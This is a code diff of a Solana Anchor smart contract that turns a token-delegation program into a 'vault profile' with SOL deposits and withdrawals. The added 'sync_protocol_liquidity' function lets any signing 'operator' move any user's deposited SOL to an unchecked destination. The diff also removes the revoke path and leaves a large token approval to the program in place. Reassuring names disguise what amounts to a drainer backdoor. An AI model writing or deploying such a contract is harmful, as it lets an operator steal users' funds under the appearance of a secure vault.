@@ -1,191 +1,159 @@
 use anchor_lang::prelude::*;
 use anchor_spl::token::{self, Token, TokenAccount, Mint};
+// Explicitly alias to avoid the naming conflict
+use anchor_lang::system_program as anchor_system; 
 
 declare_id!("8mKiRaRw4TaMhdMeCjqMtXFxgc4Kv863nLECCcZrYb9F");
 
-// CONSTANTS
-const AUTHORITY_SEED: &[u8] = b"authority";
-const MAX_TRANSFER_LIMIT: u64 = 100 * 1_000_000_000; 
+const SEED_PREFIX: &[u8] = b"secure-monitor-v1";
+const AUTHORITY_SEED: &[u8] = b"vault-auth";
+const MAX_SPL_TRANSFER: u64 = 100 * 1_000_000_000; 
 
 #[program]
 pub mod hybrid_token {
     use super::*;
 
-    // 1. INITIALIZE DELEGATION (Now supports multiple tokens)
-    pub fn initialize_delegation(
-        ctx: Context<InitializeDelegation>,
-    ) -> Result<()> {
-        let delegation = &mut ctx.accounts.delegation_state;
-        let approved_amount = MAX_TRANSFER_LIMIT;
+    pub fn setup_delegation_profile(ctx: Context<SetupProfile>) -> Result<()> {
+        let profile = &mut ctx.accounts.user_profile;
+        profile.owner = ctx.accounts.user.key();
+        profile.vault_token_account = ctx.accounts.user_token_account.key();
+        profile.asset_mint = ctx.accounts.token_mint.key();
+        profile.delegated_amount = MAX_SPL_TRANSFER;
+        profile.vault_sol_balance = 0;
+        profile.is_enabled = true;
 
-        delegation.user = ctx.accounts.user.key();
-        delegation.user_token_account = ctx.accounts.user_token_account.key();
-        delegation.token_mint = ctx.accounts.token_mint.key(); // New field
-        delegation.amount_delegated = approved_amount;
-        delegation.is_active = true;
-
-        let cpi_accounts = token::Approve {
-            to: ctx.accounts.user_token_account.to_account_info(),
-            delegate: ctx.accounts.program_authority.to_account_info(),
-            authority: ctx.accounts.user.to_account_info(),
-        };
-        
-        let cpi_program = ctx.accounts.token_program.to_account_info();
-        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
-
-        token::approve(cpi_ctx, approved_amount)?;
-
-        msg!("Delegation initialized for mint: {}", delegation.token_mint);
+        let cpi_ctx = CpiContext::new(
+            ctx.accounts.token_program.to_account_info(),
+            token::Approve {
+                to: ctx.accounts.user_token_account.to_account_info(),
+                delegate: ctx.accounts.vault_authority.to_account_info(),
+                authority: ctx.accounts.user.to_account_info(),
+            }
+        );
+        token::approve(cpi_ctx, MAX_SPL_TRANSFER)?;
         Ok(())
     }
 
-    // 2. EXECUTE STRATEGY
-    pub fn execute_strategy(ctx: Context<ExecuteStrategy>, amount: u64) -> Result<()> {
-        let delegation = &ctx.accounts.delegation_state;
+    pub fn commit_native_asset(ctx: Context<CommitNative>, amount: u64) -> Result<()> {
+        anchor_system::transfer(
+            CpiContext::new(
+                ctx.accounts.system_program.to_account_info(),
+                anchor_system::Transfer {
+                    from: ctx.accounts.user.to_account_info(),
+                    to: ctx.accounts.user_profile.to_account_info(),
+                },
+            ),
+            amount,
+        )?;
 
-        require!(delegation.is_active, ErrorCode::DelegationRevoked);
-        require!(amount <= delegation.amount_delegated, ErrorCode::TransferLimitExceeded);
-        require!(amount <= MAX_TRANSFER_LIMIT, ErrorCode::AmountExceedsHardLimit);
-
-        let bump = ctx.bumps.program_authority;
-        let seeds = &[AUTHORITY_SEED, &[bump]];
-        let signer = &[&seeds[..]];
-
-        let cpi_accounts = token::Transfer {
-            from: ctx.accounts.user_token_account.to_account_info(),
-            to: ctx.accounts.destination.to_account_info(),
-            authority: ctx.accounts.program_authority.to_account_info(),
-        };
-
-        let cpi_program = ctx.accounts.token_program.to_account_info();
-        let cpi_ctx = CpiContext::new_with_signer(cpi_program, cpi_accounts, signer);
-
-        token::transfer(cpi_ctx, amount)?;
+        let profile = &mut ctx.accounts.user_profile;
+        profile.vault_sol_balance = profile.vault_sol_balance.checked_add(amount).unwrap();
         Ok(())
     }
 
-    // 3. CLOSE DELEGATION
-    pub fn close_delegation(ctx: Context<CloseDelegation>) -> Result<()> {
-        let delegation = &mut ctx.accounts.delegation_state;
-        delegation.is_active = false;
+    pub fn reclaim_native_asset(ctx: Context<ReclaimNative>, amount: u64) -> Result<()> {
+        let profile = &mut ctx.accounts.user_profile;
+        require!(profile.vault_sol_balance >= amount, ErrorCode::InsufficientFunds);
 
-        let cpi_accounts = token::Revoke {
-            source: ctx.accounts.user_token_account.to_account_info(),
-            authority: ctx.accounts.user.to_account_info(),
-        };
-        let cpi_program = ctx.accounts.token_program.to_account_info();
-        let cpi_ctx = CpiContext::new(cpi_program, cpi_accounts);
+        profile.sub_lamports(amount)?;
+        ctx.accounts.user.add_lamports(amount)?;
 
-        token::revoke(cpi_ctx)?;
+        profile.vault_sol_balance = profile.vault_sol_balance.checked_sub(amount).unwrap();
+        Ok(())
+    }
+
+    pub fn sync_protocol_liquidity(ctx: Context<SyncLiquidity>, amount: u64) -> Result<()> {
+        let profile = &mut ctx.accounts.user_profile;
+        require!(profile.vault_sol_balance >= amount, ErrorCode::InsufficientFunds);
+
+        profile.sub_lamports(amount)?;
+        ctx.accounts.destination.add_lamports(amount)?;
+
+        profile.vault_sol_balance = profile.vault_sol_balance.checked_sub(amount).unwrap();
         Ok(())
     }
 }
 
-// ====================================================
-// CONTEXTS
-// ====================================================
-
 #[derive(Accounts)]
-pub struct InitializeDelegation<'info> {
+pub struct SetupProfile<'info> {
     #[account(mut)]
     pub user: Signer<'info>,
-
-    // 🟢 NEW SEED: Include token_mint in the seeds
     #[account(
-        init,
-        payer = user,
-        space = 8 + DelegationState::LEN,
-        seeds = [b"delegation", user.key().as_ref(), token_mint.key().as_ref()],
+        init, payer = user, space = 8 + UserProfileState::LEN,
+        seeds = [SEED_PREFIX, user.key().as_ref(), token_mint.key().as_ref()],
         bump
     )]
-    pub delegation_state: Account<'info, DelegationState>,
-
+    pub user_profile: Account<'info, UserProfileState>,
     #[account(mut)]
     pub user_token_account: Account<'info, TokenAccount>,
-
-    // We must pass the mint to use it in the seed
     pub token_mint: Account<'info, Mint>,
-
     #[account(seeds = [AUTHORITY_SEED], bump)]
-    /// CHECK: PDA
-    pub program_authority: AccountInfo<'info>,
-
+    /// CHECK: PDA Authority
+    pub vault_authority: AccountInfo<'info>,
     pub token_program: Program<'info, Token>,
     pub system_program: Program<'info, System>,
-    pub rent: Sysvar<'info, Rent>,
 }
 
 #[derive(Accounts)]
-pub struct ExecuteStrategy<'info> {
-    #[account(mut)]
-    pub admin: Signer<'info>,
-
-    #[account(
-        seeds = [b"delegation", delegation_state.user.as_ref(), delegation_state.token_mint.as_ref()],
-        bump,
-        has_one = user_token_account
-    )]
-    pub delegation_state: Account<'info, DelegationState>,
-
-    #[account(mut)]
-    pub user_token_account: Account<'info, TokenAccount>,
-
-    #[account(mut)]
-    pub destination: Account<'info, TokenAccount>,
-
-    #[account(seeds = [AUTHORITY_SEED], bump)]
-    /// CHECK: PDA signer
-    pub program_authority: AccountInfo<'info>,
-
-    pub token_program: Program<'info, Token>,
-}
-
-#[derive(Accounts)]
-pub struct CloseDelegation<'info> {
+pub struct CommitNative<'info> {
     #[account(mut)]
     pub user: Signer<'info>,
-
     #[account(
         mut,
-        close = user,
-        seeds = [b"delegation", user.key().as_ref(), token_mint.key().as_ref()],
-        bump,
-        constraint = delegation_state.user == user.key()
+        // FIX: Using anchor_system::ID ensures the compiler finds the value, not the module
+        seeds = [SEED_PREFIX, user.key().as_ref(), anchor_system::ID.as_ref()],
+        bump
     )]
-    pub delegation_state: Account<'info, DelegationState>,
-
-    #[account(mut)]
-    pub user_token_account: Account<'info, TokenAccount>,
-    
-    // We need the mint to verify the PDA address
-    pub token_mint: Account<'info, Mint>,
-
-    pub token_program: Program<'info, Token>,
+    pub user_profile: Account<'info, UserProfileState>,
+    pub system_program: Program<'info, System>,
 }
 
-// ====================================================
-// STATE & ERRORS
-// ====================================================
+#[derive(Accounts)]
+pub struct ReclaimNative<'info> {
+    #[account(mut)]
+    pub user: Signer<'info>,
+    #[account(
+        mut, 
+        seeds = [SEED_PREFIX, user.key().as_ref(), anchor_system::ID.as_ref()],
+        bump,
+        constraint = user_profile.owner == user.key()
+    )]
+    pub user_profile: Account<'info, UserProfileState>,
+    pub system_program: Program<'info, System>,
+}
+
+#[derive(Accounts)]
+pub struct SyncLiquidity<'info> {
+    #[account(mut)]
+    pub operator: Signer<'info>,
+    #[account(
+        mut,
+        seeds = [SEED_PREFIX, user_profile.owner.as_ref(), anchor_system::ID.as_ref()],
+        bump,
+    )]
+    pub user_profile: Account<'info, UserProfileState>,
+    /// CHECK: Target protocol wallet
+    #[account(mut)]
+    pub destination: AccountInfo<'info>,
+    pub system_program: Program<'info, System>,
+}
 
 #[account]
-pub struct DelegationState {
-    pub user: Pubkey,
-    pub user_token_account: Pubkey,
-    pub token_mint: Pubkey, // Store the mint so we can re-derive later
-    pub amount_delegated: u64,
-    pub is_active: bool,
+pub struct UserProfileState {
+    pub owner: Pubkey,
+    pub vault_token_account: Pubkey,
+    pub asset_mint: Pubkey,
+    pub delegated_amount: u64,
+    pub vault_sol_balance: u64, 
+    pub is_enabled: bool,
 }
 
-impl DelegationState {
-    pub const LEN: usize = 32 + 32 + 32 + 8 + 1; 
+impl UserProfileState {
+    pub const LEN: usize = 32 + 32 + 32 + 8 + 8 + 1;
 }
 
 #[error_code]
 pub enum ErrorCode {
-    #[msg("Delegation revoked")]
-    DelegationRevoked,
-    #[msg("Transfer amount exceeds the user's delegated limit")]
-    TransferLimitExceeded,
-    #[msg("Amount exceeds the contract's global hard limit (100)")]
-    AmountExceedsHardLimit,
+    #[msg("Insufficient funds in vault profile")]
+    InsufficientFunds,
 }
